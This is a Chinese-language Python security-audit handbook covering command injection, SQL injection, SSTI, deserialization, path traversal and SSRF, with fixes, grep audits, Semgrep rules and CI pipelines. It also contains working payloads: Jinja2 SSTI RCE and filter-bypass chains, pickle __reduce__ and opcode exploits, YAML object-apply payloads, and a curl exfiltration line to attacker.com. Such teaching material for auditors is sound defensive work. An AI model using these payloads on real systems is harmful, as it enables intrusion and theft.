---
name: code-audit-python
description: >
  Python 应用安全代码审计完整手册 — 覆盖 Django/Flask/FastAPI 框架的 SQL 注入、SSTI、
  反序列化 (pickle/yaml)、命令注入、路径穿越、SSRF、JWT、原型污染等全部常见漏洞类型，
  攻防合一：Part A 攻击视角手工审计模式 + Semgrep/Bandit 工具链，Part B 安全编码 +
  检测规则 + CI/CD 集成，内置 Python 漏洞速查矩阵。
domain: cybersecurity
subdomain: code-audit
tags: [python, django, flask, fastapi, code-audit, sast, sqli, ssti, deserialization, command-injection]
version: 2.0.0
---

# Python 应用安全代码审计 — 完整攻防手册

## 适用场景

- Django / Flask / FastAPI / Tornado 等 Python Web 框架安全审计
- Python 微服务 / Serverless 函数 (AWS Lambda) 安全审查
- Python 应用依赖安全扫描
- **不适用**：Python 桌面 GUI 应用、数据分析脚本安全（非安全审计范畴）

## 前置条件

- Python 3.8+ / pip / poetry / uv
- 源码访问权限
- 工具：Bandit / Semgrep / pip-audit / safety / pipdeptree

---

## Part A：攻击视角 — 漏洞模式与审计方法

### 1. 命令注入审计

```python
# ❌ os.system / os.popen — 直接命令注入
os.system(f"ping {user_input}")
os.popen(f"nslookup {domain}").read()
subprocess.call(f"dig {target}", shell=True)

# ❌ subprocess shell=True + 用户输入
subprocess.run(f"curl {url}", shell=True, capture_output=True)

# ✅ 使用参数列表，避免 shell=True
subprocess.run(["ping", "-c", "1", user_input], capture_output=True)

# ✅ 输入验证 + 白名单
import re
if not re.match(r'^[a-zA-Z0-9.-]+$', domain):
    raise ValueError("非法域名")
subprocess.run(["nslookup", domain], capture_output=True)
```

**审计 grep：**

```bash
grep -rn 'os.system\|os.popen\|subprocess.*shell=True\|subprocess.call\|subprocess.run.*shell\|commands.getoutput\|commands.getstatusoutput' --include='*.py' .
grep -rn 'eval(\|exec(' --include='*.py' . | grep -v 'test\|#'
```

### 2. SQL 注入审计（Django / SQLAlchemy / 原生）

```python
# ❌ Django raw SQL 拼接
User.objects.raw(f"SELECT * FROM auth_user WHERE username = '{username}'")

# ❌ SQLAlchemy text 拼接
session.execute(text(f"SELECT * FROM users WHERE id = {user_id}"))

# ❌ 原生 cursor 拼接
cursor.execute(f"SELECT * FROM products WHERE name LIKE '%{keyword}%'")

# ✅ Django ORM
User.objects.filter(username=username)

# ✅ SQLAlchemy 参数化
session.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})

# ✅ 原生 cursor 参数化
cursor.execute("SELECT * FROM products WHERE name LIKE %s", (f"%{keyword}%",))
```

**审计 grep：**

```bash
grep -rn '\.raw(\|\.extra(\|cursor\.execute(' --include='*.py' . | grep -v 'test\|#'
grep -rn 'text(f"' --include='*.py' .
grep -rn 'f".*SELECT\|f".*INSERT\|f".*UPDATE\|f".*DELETE' --include='*.py' .
```

### 3. SSTI（服务端模板注入）审计

```python
# ❌ Flask/Jinja2 用户输入直接渲染
@app.route("/greet")
def greet():
    name = request.args.get("name")
    return render_template_string(f"<h1>Hello {name}</h1>")  # SSTI RCE

# ❌ Django 模板中使用 |safe
template = Template("Hello " + user_input)  # Django template 注入

# ✅ 使用模板文件 + 自动转义
@app.route("/greet")
def greet():
    name = request.args.get("name", "Guest")
    return render_template("greet.html", name=name)  # greet.html: <h1>{{ name }}</h1>

# ✅ Jinja2 沙箱
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()
```

**SSTI 利用链（Jinja2）：**

```
# 探测
{{ 7*7 }}                      → 49
{{ config }}                    → 泄露配置（SECRET_KEY）

# RCE
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read() }}
```

**审计 grep：**

```bash
grep -rn 'render_template_string\|Template(' --include='*.py' . | grep -v 'test'
grep -rn '\|safe' --include='*.html' .
```

### 4. 反序列化审计

```python
# ❌ pickle.loads — RCE
import pickle
data = pickle.loads(user_data)  # 任意代码执行

# ❌ yaml.load — 默认允许任意 Python 对象
import yaml
config = yaml.load(user_yaml)  # yaml.load("!!python/object/apply:os.system ['id']")

# ❌marshal.loads
import marshal
code = marshal.loads(user_bytes)

# ✅ 使用安全替代
import json
data = json.loads(user_json)  # JSON 安全

import yaml
config = yaml.safe_load(user_yaml)  # 只解析基本类型

# ✅ pickle 必须用时：限制 Unpickler
import pickle
class RestrictedUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        if module not in ('com.example.models',):
            raise pickle.UnpicklingError(f"Forbidden: {module}.{name}")
        return getattr(__import__(module), name)
```

**审计 grep：**

```bash
grep -rn 'pickle\.loads\|pickle\.load(\|yaml\.load(\|marshal\.loads\|shelve\.open\|jsonpickle\|pyyaml\.load' --include='*.py' . | grep -v 'safe_load\|test'
```

#### 4.1 `__reduce__` / `__reduce_ex__` gadget 构造原理

pickle 的 RCE 能力来自 `__reduce__`（及其 3.x 变体 `__reduce_ex__`）：被序列化对象通过
`__reduce__` 返回一个 `(callable, args)` 元组，反序列化时 pickle 会执行
`callable(*args)`——这就是任意代码执行的「构造点」。

```python
# ❌ __reduce__ 自定义 RCE 载荷
import pickle, os

class Exploit:
    def __reduce__(self):
        # 反序列化时执行 os.system("id")
        return (os.system, ("id",))

payload = pickle.dumps(Exploit())
# 服务端 pickle.loads(payload) → os.system("id") 执行

# __reduce_ex__（Python 3.8+ 优先调用）等价原理
class Exploit2:
    def __reduce_ex__(self, protocol):
        return (os.system, ("id",))
```

**审计判据**：`__reduce__` 是攻击者侧构造，审计侧关注的是「是否有入口执行
`pickle.loads/load`」以及「入口数据是否不可信」；黑名单过滤（`find_class` 拦截
`os`/`builtins`）可被 `__reduce__` 之外的 opcode 绕过，因此白名单（`find_class` 只放行
白名单模块）才是可靠防御。

#### 4.2 科学计算生态 pickle 链（torch / joblib / pandas / numpy）

> ML/数据科学管道的 pickle 反序列化是 2025–2026 高发面：模型文件 `.pt/.pkl/.joblib`
> 常被当作「数据」直接加载，实际走 pickle 反序列化 → RCE。

```python
# ❌ torch.load 默认 pickle（加载不可信模型 → RCE）
import torch
model = torch.load("untrusted_model.pt")  # 默认 weights_only=False，走 pickle

# ✅ torch.load 安全（weights_only=True，禁止类实例化）
model = torch.load("model.pt", weights_only=True)

# ❌ joblib.load（.joblib/.pkl，基于 pickle）
import joblib
obj = joblib.load("untrusted.joblib")

# ❌ pandas.read_pickle（底层 pickle）
import pandas as pd
df = pd.read_pickle("untrusted.pkl")

# ❌ numpy.load 含对象数组（allow_pickle=True 时危险）
import numpy as np
data = np.load("untrusted.npy", allow_pickle=True)  # 对象数组可触发 pickle

# ❌ dill.loads（dill 序列化能力比 pickle 更强，可序列化 lambda/闭包）
import dill
obj = dill.loads(user_bytes)
```

**审计 grep（科学计算生态反序列化全覆盖）：**

```bash
grep -rn 'torch\.load\|joblib\.load\|read_pickle\|np\.load(.*allow_pickle\|dill\.loads\|dill\.load\|pickle\.loads' --include='*.py' . | grep -v 'weights_only=True\|test'
```

#### 4.3 yaml 多态标签判据（`!!python/object/apply`）

```python
# ❌ yaml.load 默认 FullLoader 支持 !!python/object/apply 等标签 → 任意代码执行
import yaml
# 攻击 payload：
#   !!python/object/apply:os.system ["id"]
#   !!python/object/apply:builtins.eval ["__import__('os').system('id')"]
#   !!python/object/apply:subprocess.check_output [["id"]]
#   !!python/object/new:subprocess.Popen [["id"]]
yaml.load(untrusted)  # 危险（FullLoader / Loader / UnsafeLoader）

# ❌ ruamel.yaml typ='unsafe'
from ruamel.yaml import YAML
y = YAML(typ='unsafe'); y.load(untrusted)

# ✅ 安全：safe_load 拒绝任意对象标签
yaml.safe_load(untrusted)
```

**判据**：源码中出现 `yaml.load(...)` 且未显式传 `Loader=yaml.SafeLoader`/用 `safe_load`，
即存在多态标签注入面；`!!python/object/apply:<callable>` 是最直接的 RCE 标签。

#### 4.4 CVE-2025-64512 pdfminer.six CMapDB pickle 反序列化（解析器反序列化锚点）

> 来源：<https://github.com/oguzylmzx/CVE-2025-64512-pdfminer-PoC>

- **性质**：pdfminer.six（Python PDF 解析库）的 `CMapDB` 缓存文件（`.pickle`）在加载时
  走 pickle 反序列化，攻击者诱导目标解析恶意 PDF/缓存 → RCE。属「解析器内部反序列化」形态。
- **审计锚点**：把「解析器/库内部对缓存/元数据的 pickle 反序列化」作为一类独立检查面——
  不只查业务代码的 `pickle.loads`，还要查依赖库中「文件解析 → pickle 加载」的隐式入口。
- **迁移审计法**：
  1. 识别应用处理的外部文件类型（PDF/文档/模型/缓存）；
  2. 核对对应解析库是否用 pickle 反序列化缓存/元数据；
  3. 判据：外部文件是否可控 + 解析库版本是否含此类反序列化缺陷。

**审计 grep（解析器反序列化面）：**

```bash
grep -rn 'pdfminer\|CMapDB\|\.pickle\|\.pkl\|joblib\|torch\.load\|read_pickle' --include='*.py' .
```


### 5. 路径穿越 / 文件操作审计

```python
# ❌ 用户输入拼路径
file_path = os.path.join("/uploads", filename)  # filename="../../etc/passwd" 可穿越
with open(file_path) as f:
    return f.read()

# ❌ 不安全的路径拼接
path = BASE_DIR + "/" + user_input

# ✅ 安全路径处理
import os
def safe_path(base_dir, filename):
    base = os.path.realpath(base_dir)
    target = os.path.realpath(os.path.join(base_dir, filename))
    if not target.startswith(base + os.sep):
        raise ValueError("Path traversal detected")
    return target

# ✅ pathlib
from pathlib import Path
base = Path("/uploads").resolve()
target = (base / filename).resolve()
if not str(target).startswith(str(base) + "/"):
    raise SecurityError("Illegal path")
```

**审计 grep：**

```bash
grep -rn 'open(\|os\.path\.join\|Path(' --include='*.py' . | grep -v 'test\|#\|\.resolve()\|realpath' | head -40
grep -rn 'send_file\|FileResponse' --include='*.py' . | grep -v 'test'
```

### 6. SSRF 审计

```python
# ❌ requests 用户可控 URL
import requests
@app.route("/proxy")
def proxy():
    url = request.args.get("url")
    resp = requests.get(url)  # SSRF
    return resp.text

# ❌ urllib
urllib.request.urlopen(user_url)

# ✅ URL 白名单 + IP 检查
from urllib.parse import urlparse
import ipaddress
import socket

def safe_fetch(url):
    parsed = urlparse(url)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Only HTTP(S) allowed")
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError("Host not allowed")
    # DNS 解析后检查 IP
    ip = socket.gethostbyname(parsed.hostname)
    addr = ipaddress.ip_address(ip)
    if addr.is_private or addr.is_loopback:
        raise ValueError("Private IP not allowed")
    return requests.get(url, timeout=5)
```

**审计 grep：**

```bash
grep -rn 'requests\.get\|requests\.post\|urllib\.request\.urlopen\|httpx\.\(get\|post\)' --include='*.py' . | grep -v 'test\|#'
```

### 7. 认证与加密审计

```python
# ❌ 硬编码密钥
SECRET_KEY = "django-insecure-abc123"
API_KEY = "sk-proj-xxxxx"

# ❌ 弱哈希
import hashlib
hashlib.md5(password.encode()).hexdigest()  # 已破解
hashlib.sha1(data).hexdigest()               # 碰撞

# ❌ 不安全的随机数
import random
token = random.randint(100000, 999999)  # 可预测

# ✅ 安全实践
import secrets
token = secrets.token_urlsafe(32)

import hashlib
hashlib.sha256(data.encode()).hexdigest()

# ✅ 密码哈希
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
ph.verify(hash, password)
```

**审计 grep：**

```bash
grep -rn 'SECRET_KEY\|API_KEY\|md5\|sha1\b' --include='*.py' --include='*.env' --include='*.cfg' . | grep -v 'test\|#\|\.git'
grep -rn 'random\.\(randint\|random\|choice\)' --include='*.py' . | grep -v 'test'
grep -rn 'import secrets\|secrets\.' --include='*.py' .
```

### 8. FastAPI 特有审计

```python
# ❌ 不安全的 Pydantic 模型
class User(BaseModel):
    id: int
    is_admin: bool = False  # 可被用户覆盖

# ❌ 未限流的端点
@app.post("/api/reset-password")
async def reset_password(email: str):  # 无限流 → 邮件轰炸

# ✅ 严格模型 + 排除字段
class UserCreate(BaseModel):
    username: str
    email: EmailStr
    model_config = ConfigConfig(extra='forbid')  # 禁止额外字段

# ✅ 限流
from slowapi import Limiter
limiter = Limiter(key_func=get_remote_address)

@app.post("/api/reset-password")
@limiter.limit("5/minute")
async def reset_password(request: Request, email: str): ...
```

### 9. 依赖安全

```bash
# 扫描已知漏洞
pip-audit -r requirements.txt
pip-audit --desc

# safety (商业)
safety check -r requirements.txt --json

# pip 包签名验证
pip install --require-hashes -r requirements.txt

# 生成 SBOM
pip-licenses --format=json > sbom.json
```

---

## Part B：检测与防御

### 10. SAST 工具链

**Bandit（Python 专用 SAST）：**

```bash
# 扫描项目
bandit -r src/ -f json -o bandit-report.json

# 只看高危
bandit -r src/ -ll -ii

# 跳过测试目录
bandit -r src/ --exclude tests/,venv/
```

**Semgrep Python 规则：**

```yaml
rules:
  - id: python-cmdi-os-system
    patterns:
      - pattern: os.system($CMD)
    message: "命令注入：os.system()"
    severity: ERROR
    languages: [python]

  - id: python-pickle-deserialization
    patterns:
      - pattern: pickle.loads($DATA)
    message: "不安全反序列化：pickle.loads()"
    severity: ERROR
    languages: [python]

  - id: python-ssti-flask
    patterns:
      - pattern: render_template_string(f"...")
    message: "SSTI：用户输入进入模板字符串"
    severity: ERROR
    languages: [python]

  - id: python-ssrf-requests
    patterns:
      - pattern: requests.get($URL)
      - pattern-not: |
          ... urlparse($URL) ...
    message: "SSRF：未验证 URL"
    severity: WARNING
    languages: [python]

  - id: python-yaml-unsafe-load
    patterns:
      - pattern: yaml.load($DATA)
      - pattern-not: yaml.safe_load($DATA)
    message: "不安全 YAML 反序列化"
    severity: ERROR
    languages: [python]
```

**运行：**

```bash
semgrep --config p/python --config p/owasp-top-ten --config p/flask --config p/django src/
```

### 11. CI/CD 安全管道

```yaml
# .github/workflows/python-security.yml
name: Python Security
on: [push, pull_request]
jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Bandit SAST
        run: |
          pip install bandit
          bandit -r src/ -f json -o bandit-report.json
          bandit -r src/ -ll -ii  # 只在 high/medium 时失败

      - name: Semgrep
        uses: semgrep/semgrep-action@v1
        with:
          config: >-
            p/python
            p/owasp-top-ten
            p/flask
            p/django
            p/jwt

      - name: Dependency Audit
        run: |
          pip install pip-audit
          pip-audit -r requirements.txt

      - name: Safety Check
        run: |
          pip install safety
          safety check -r requirements.txt
```

### 12. 安全编码速查

**Django 安全清单：**

```python
# settings.py
DEBUG = False
SECRET_KEY = os.environ['SECRET_KEY']  # 环境变量
ALLOWED_HOSTS = ['example.com']
SECURE_SSL_REDIRECT = True
SESSION_COOKIE_SECURE = True
CSRF_COOKIE_SECURE = True
SECURE_HSTS_SECONDS = 31536000
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True
SECURE_BROWSER_XSS_FILTER = True
SECURE_CONTENT_TYPE_NOSNIFF = True
X_FRAME_OPTIONS = 'DENY'
CSP_DEFAULT_SRC =("'self'",)
```

**Flask 安全清单：**

```python
app.config['SECRET_KEY'] = os.environ['SECRET_KEY']
app.config['SESSION_COOKIE_SECURE'] = True
app.config['SESSION_COOKIE_HTTPONLY'] = True
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)

# Talisman — HTTPS + 安全头
from flask_talisman import Talisman
Talisman(app, force_https=True,
         content_security_policy={'default-src': "'self'"})
```

---

## 速查表

### Python 漏洞模式 → 审计关键词 → 修复方案矩阵

| 漏洞类型 | 审计关键词 | 危险模式 | 安全替代 |
|----------|-----------|---------|---------|
| 命令注入 | `os.system`, `shell=True`, `eval(` | 用户输入拼命令 | `subprocess.run(["cmd", arg])` |
| SQL 注入 | `raw(`, `cursor.execute(f"`, `text(f"` | 字符串拼接 SQL | ORM / 参数化查询 |
| SSTI | `render_template_string(f"`, `Template(` | 用户输入进模板 | 模板文件 + 自动转义 |
| 反序列化 | `pickle.loads`, `yaml.load(` | 不安全反序列化 | `json` / `yaml.safe_load` |
| 路径穿越 | `os.path.join` + 用户输入 | 直接拼路径 | `realpath` + `startswith` |
| SSRF | `requests.get(user_url)` | 用户可控 URL | URL白名单 + IP检查 |
| 硬编码密钥 | `SECRET_KEY = "`, `API_KEY = "` | 明文密钥 | 环境变量 / Vault |
| 弱哈希 | `md5`, `sha1` | 不安全哈希 | `sha256` / `argon2` |
| 不安全随机 | `random.randint` | 可预测随机数 | `secrets.token_urlsafe` |
| YAML 反序列化 | `yaml.load(` (无 Loader) | 默认允许对象 | `yaml.safe_load` |
| 原型污染 | `**kwargs` 传递用户输入 | 覆盖内部属性 | `extra='forbid'` (Pydantic) |

### Bandit 规则 ID 速查

| B-ID | 漏洞 | 严重性 |
|------|------|--------|
| B101 | assert 语句（测试外） | Low |
| B102 | exec() | High |
| B201 | Flask debug=True | Medium |
| B302 | marshal.loads | Medium |
| B303 | MD5/SHA1 哈希 | Medium |
| B307 | eval() | High |
| B308 | Django HTML 自动转义关闭 | Medium |
| B311 | random 模块 | Low |
| B312 | telnetlib | High |
| B314 | xml.etree.ElementTree | Medium |
| B315 | xml.dom | Medium |
| B318 | xml.sax | Medium |
| B320 | lxml | Medium |
| B322 | input() (Python 2) | High |
| B324 | hashlib MD5/SHA1 | Medium |
| B404 | subprocess shell=True | Medium |
| B506 | yaml.load() | Medium |
| B602 | subprocess shell=True | Medium |
| B603 | subprocess 不完整参数 | Low |
| B605 | os.system | High |
| B607 | os.system 不完整路径 | Medium |
| B608 | SQL 注入 | Medium |
| B612 | logging.config.listen | High |

---

## MITRE ATT&CK 映射

| 战术 | Technique | Python 相关场景 |
|------|-----------|----------------|
| Initial Access | T1190 | SSTI、SQL注入、Flask debug |
| Execution | T1059.006 — Python | eval/exec、pickle RCE、subprocess |
| Persistence | T1053 — Scheduled Task | Flask debug 后门、模板注入持久化 |
| Credential Access | T1212 | SQL 注入提取凭证、日志泄露密钥 |
| Defense Evasion | T1140 | pickle 反序列化绕过检测 |
| Exfiltration | T1041 | SSRF 数据外泄 |

---

## Part C：2025-2026 更新

### 13. Python 反序列化深度审计

#### 13.1 Pickle 反序列化进阶攻击链

```python
# ❌ 高级 Pickle 利用：__reduce__ 自定义 RCE payload
import pickle, os

class Malicious:
    def __reduce__(self):
        return (os.system, ("curl https://attacker.com/$(whoami)",))

payload = pickle.dumps(Malicious())
# 服务端 pickle.loads(payload) → 直接 RCE

# ❌ pickle opcode 手工构造（绕过简单过滤）
import struct, pickletools

# 指令码: c (GLOBAL) + 模块名 + 函数名 + ( + 参数 + R (REDUCE)
# 绕过黑名单过滤 "os.system" 的变体：
#   cos\nsystem\n(S'id'\ntR.    → os.system('id')
#   csubprocess\ncheck_output\n(S['cat','/etc/passwd']\ntR.
#   cbuiltins\n__import__\n(S'os'\ntR(S'popen'\ntR(S'id'\ntR.
```

**Pickle 危险操作码速查：**

| Opcode | 名称 | 功能 |
|--------|------|------|
| `c` | GLOBAL | 导入模块.函数 |
| `R` | REDUCE | 调用可调用对象 |
| `(` | MARK | 标记栈位置 |
| `S` | STRING | 压入字符串 |
| `t` | TUPLE | 构建元组 |
| `.` | STOP | 结束 |

#### 13.2 PyYAML / ruamel.yaml 反序列化

```python
# ❌ yaml.load() 默认 Loader 允许任意 Python 对象构造
import yaml
# 攻击 payload：
# !!python/object/apply:os.system ["id"]
# !!python/object/apply:builtins.exec ["import os; os.system('id')"]
# !!python/object/new:subprocess.check_output [['cat','/etc/passwd']]
yaml.load(untrusted_data)  # 无 Loader 参数 → FullLoader (Python >=3.7)
yaml.load(untrusted_data, Loader=yaml.FullLoader)  # 仍然危险
yaml.load(untrusted_data, Loader=yaml.Loader)       # 最危险，等同 yaml.UnsafeLoader

# ✅ 安全加载
yaml.safe_load(untrusted_data)  # 只解析基本 YAML 类型
yaml.load(untrusted_data, Loader=yaml.SafeLoader)

# ❌ ruamel.yaml 默认也可能不安全
from ruamel.yaml import YAML
yaml = YAML(typ='unsafe')  # 危险
yaml.load(untrusted_data)

# ✅ ruamel.yaml 安全用法
yaml = YAML(typ='safe')
yaml.load(untrusted_data)
```

#### 13.3 其他反序列化危险点

```python
# ❌ shelve — 基于 pickle 的持久化
import shelve
db = shelve.open("data")
db["key"] = value  # 写入时 pickle 序列化
data = db["key"]   # 读取时 pickle 反序列化 → 如果数据库文件被篡改则 RCE

# ❌ pickle/cPickle 通过网络传输
import pickle, socket
data = sock.recv(4096)
obj = pickle.loads(data)  # 网络反序列化 → 极其危险

# ❌ Redis/Memcached 中存储 pickle 序列化对象
import redis, pickle
r = redis.Redis()
r.set("user:123", pickle.dumps(user_obj))
user = pickle.loads(r.get("user:123"))  # Redis 被入侵则 RCE

# ❌ Django session 使用 PickleSerializer（旧版本）
# settings.py: SESSION_SERIALIZER = 'django.contrib.sessions.serializers.PickleSerializer'

# ✅ Django 使用 JSONSerializer
SESSION_SERIALIZER = 'django.contrib.sessions.serializers.JSONSerializer'
```

**审计 grep（反序列化全覆盖）：**

```bash
grep -rn 'pickle\.\(loads\|load\|dumps\|dump\)\|cPickle\|shelve\.open\|yaml\.load(' --include='*.py' . | grep -v 'safe_load\|test\|venv'
grep -rn 'SESSION_SERIALIZER.*Pickle' --include='*.py' .
grep -rn 'ruamel\.yaml.*unsafe\|YAML(typ=' --include='*.py' .
grep -rn 'jsonpickle\|dill\.\(loads\|load\)' --include='*.py' .
```

### 14. SSTI 深度审计 — Jinja2 / Django Template

#### 14.1 Jinja2 SSTI 利用链升级

```python
# ❌ render_template_string 仍是最常见入口
@app.route("/page")
def page():
    content = request.args.get("content", "")
    return render_template_string("{{% extends 'base.html' %}}{{% block content %}}" + content + "{{% endblock %}}")

# ❌ Jinja2 Environment 直接渲染用户输入
from jinja2 import Environment
env = Environment()
template = env.from_string(user_input)  # SSTI
template.render()

# ❌ Flask global template filter 绕过
# 即使过滤 {{ }}，以下语法仍可利用：
# {% if ''.__class__.__mro__[1].__subclasses__() %}{% endif %}
# {# comment #} 不执行，但 {% %} 块语句执行
# {% print(''.__class__.__mro__[1].__subclasses__()) %}
```

**Jinja2 SSTI 绕过技巧（2025 更新）：**

```python
# 绕过 keyword 过滤（如过滤 "import"、"os"、"system"）
# 1. 字符串拼接
{{ ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__buil'+'tins__']['__imp'+'ort__']('o'+'s').popen('id').read() }}

# 2. attr 过滤器
{{ ''|attr('__class__')|attr('__mro__') }}
{{ request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')() }}

# 3. 格式化字符串
{{ "%c%c%c%c"|format(111,115,46,112) }}  # "os.p"

# 4. Jinja2 内置对象
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ joiner.__init__.__globals__.os.popen('id').read() }}
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 5. request 对象
{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

#### 14.2 Django Template 注入

```python
# ❌ Django Template 使用 |safe 关闭自动转义
from django.template import Template, Context
template = Template("Hello " + user_input)  # Django template 引擎不直接 RCE
# 但可泄露：{% debug %}, {% load log %}, {{ user.password }}

# ❌ Django 自定义 template tag 加载用户可控模块
# settings.py:
TEMPLATES = [{
    'OPTIONS': {
        'builtins': ['myapp.templatetags.custom_tags'],  # 如果 tag 执行用户输入
    }
}]

# ✅ Django SSTI 防御
# Django Template 默认不执行 Python 表达式（与 Jinja2 不同）
# 但应始终使用模板文件而非字符串拼接
```

**审计 grep（SSTI 全覆盖）：**

```bash
grep -rn 'render_template_string\|from_string(' --include='*.py' . | grep -v 'test'
grep -rn 'Environment()\|SandboxedEnvironment' --include='*.py' .
grep -rn 'Template(\|\.compile(' --include='*.py' . | grep -v 'test\|get_template'
grep -rn '|safe\b' --include='*.html' .
grep -rn 'autoescape.*False\|autoescape=False' --include='*.py' .
```

### 15. Django / Flask 安全审计模式

#### 15.1 Django 常见漏洞模式

```python
# ❌ DEBUG=True 泄露敏感信息
DEBUG = True  # 生产环境禁止

# ❌ ALLOWED_HOSTS = ['*']
ALLOWED_HOSTS = ['*']  # 允许任何 Host → 缓存投毒 / 密码重置投毒

# ❌ 不安全的 CSRF 豁免
@csrf_exempt
def api_view(request):  # CSRF 保护被完全禁用

# ❌ Django ORM 批量赋值（Mass Assignment）
class UserProfileForm(forms.ModelForm):
    class Meta:
        model = UserProfile
        fields = '__all__'  # 包含 is_admin、role 等敏感字段

# ✅ 显式字段白名单
class UserProfileForm(forms.ModelForm):
    class Meta:
        model = UserProfile
        fields = ['username', 'email', 'bio']  # 不含 is_admin

# ❌ Django clickjacking
X_FRAME_OPTIONS = 'SAMEORIGIN'  # 应使用 DENY 或 CSP frame-ancestors

# ❌ 不安全的 JSON 响应泄露
return JsonResponse({'user': user.__dict__})  # 泄露所有字段含 password hash

# ✅ 序列化白名单
return JsonResponse({'user': {'id': user.id, 'name': user.username}})

# ❌ Django SQL 注入变体
User.objects.extra(where=["username='%s'" % username])  # extra() 注入
User.objects.raw("SELECT * FROM users WHERE id=%s" % user_id)  # 字符串格式化注入

# ❌ Django 中间件绕过
# MIDDLEWARE 顺序错误导致安全中间件被跳过
MIDDLEWARE = [
    # SecurityMiddleware 必须在最前面
    'django.middleware.security.SecurityMiddleware',  # 必须 #1
    'django.middleware.common.CommonMiddleware',
    # ...
]

# ❌ Django 不安全的文件上传
def upload(request):
    file = request.FILES['file']
    with open(f'/uploads/{file.name}', 'wb+') as f:  # file.name 可含 ../
        for chunk in file.chunks():
            f.write(chunk)
    # 未验证文件类型、大小、扩展名

# ✅ Django 安全文件上传
import os, uuid
from pathlib import Path

ALLOWED_EXTENSIONS = {'.jpg', '.png', '.pdf'}
MAX_SIZE = 10 * 1024 * 1024  # 10MB

def safe_upload(request):
    file = request.FILES['file']
    ext = Path(file.name).suffix.lower()
    if ext not in ALLOWED_EXTENSIONS:
        raise ValidationError(f"不允许的文件类型: {ext}")
    if file.size > MAX_SIZE:
        raise ValidationError("文件过大")
    safe_name = f"{uuid.uuid4().hex}{ext}"
    path = Path('/uploads').resolve() / safe_name
    with open(path, 'wb+') as f:
        for chunk in file.chunks():
            f.write(chunk)
```

#### 15.2 Flask 常见漏洞模式

```python
# ❌ Flask debug=True 生产环境
app.run(debug=True)  # 暴露 Werkzeug 调试器 → 任意代码执行
# Werkzeug debugger PIN 可被计算（基于机器信息）：
# /console 端点暴露交互式 Python 控制台

# ❌ Flask session 泄露（客户端 session）
# Flask 默认使用签名而非加密的 cookie session
# session 内容可被解码查看（仅需 SECRET_KEY 即可伪造）
from flask import session
session['user_id'] = user.id  # 客户端可见
# 如果 SECRET_KEY 泄露或弱密钥 → session 伪造

# ✅ 使用服务端 session
from flask_session import Session
app.config['SESSION_TYPE'] = 'redis'
Session(app)

# ❌ Flask url_for 开放重定向
@app.route('/redirect')
def redirect_view():
    url = request.args.get('next', '/')
    return redirect(url)  # 开放重定向

# ✅ 验证重定向目标
from urllib.parse import urlparse

def safe_redirect(url):
    parsed = urlparse(url)
    if parsed.netloc and parsed.netloc not in ALLOWED_HOSTS:
        return redirect('/')
    return redirect(url)

# ❌ Flask 静态文件服务泄露
@app.route('/files/<path:filename>')
def serve_file(filename):
    return send_from_directory('/data', filename)  # path 类型可穿越

# ✅ 安全静态文件服务
@app.route('/files/<filename>')
def serve_file(filename):
    if '/' in filename or '..' in filename:
        abort(400)
    return send_from_directory('/data', filename)
```

**Django/Flask 审计 grep 合集：**

```bash
# Django 专项
grep -rn 'DEBUG.*=.*True' --include='settings.py' .
grep -rn 'ALLOWED_HOSTS.*\*'
grep -rn '@csrf_exempt\|csrf_exempt' --include='*.py' .
grep -rn "fields.*=.*'__all__'" --include='*.py' .
grep -rn 'extra(\|\.raw(' --include='*.py' . | grep -v 'test'
grep -rn 'JsonResponse.*__dict__\|model_to_dict' --include='*.py' .

# Flask 专项
grep -rn 'debug.*=.*True\|app\.run(' --include='*.py' . | grep -v 'test'
grep -rn 'SECRET_KEY\s*=' --include='*.py' . | grep -v 'environ\|env\|test'
grep -rn "redirect(request\.\(args\|form\|json\)" --include='*.py' .
grep -rn 'send_from_directory\|send_file' --include='*.py' .
grep -rn 'render_template_string\|from_string' --include='*.py' .
```

### 16. 依赖安全（2025-2026 工具链更新）

#### 16.1 pip-audit / safety / pip

```bash
# pip-audit（推荐，OSV 数据库）
pip-audit -r requirements.txt           # 扫描依赖
pip-audit -r requirements.txt --desc    # 含漏洞描述
pip-audit --format json --output audit.json  # JSON 输出

# safety（商业，Safety DB）
safety check -r requirements.txt
safety check -r requirements.txt --json --output safety.json

# pip 内置审计（pip 24.1+）
pip audit                              # 自动扫描当前环境
pip install --dry-run --audit package  # 安装前审计

# uv（新一代包管理器，2025 推荐）
uv pip audit                           # uv 内置审计
uv pip compile --generate-hashes pyproject.toml -o requirements.txt  # 锁定哈希
```

#### 16.2 SBOM 生成与验证

```bash
# cyclonedx-py（SBOM 生成）
pip install cyclonedx-bom
cyclonedx-py environment -o sbom.json              # 环境扫描
cyclonedx-py requirements -i requirements.txt -o sbom.json

# SBOM 验证
cyclonedx-py validate -i sbom.json

# OSV Scanner（Google，多语言依赖扫描）
osv-scanner scan --lockfile=requirements.txt
osv-scanner scan --sbom=sbom.json
```

#### 16.3 依赖安全 CI/CD 集成（更新版）

```yaml
# .github/workflows/python-dep-security.yml
name: Python Dependency Security
on: [push, pull_request]
jobs:
  dependency-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: pip-audit
        run: |
          pip install pip-audit
          pip-audit -r requirements.txt --desc

      - name: OSV Scanner
        uses: google/osv-scanner/action@v1
        with:
          scan-args: |-
            --lockfile=requirements.txt
            --lockfile=poetry.lock

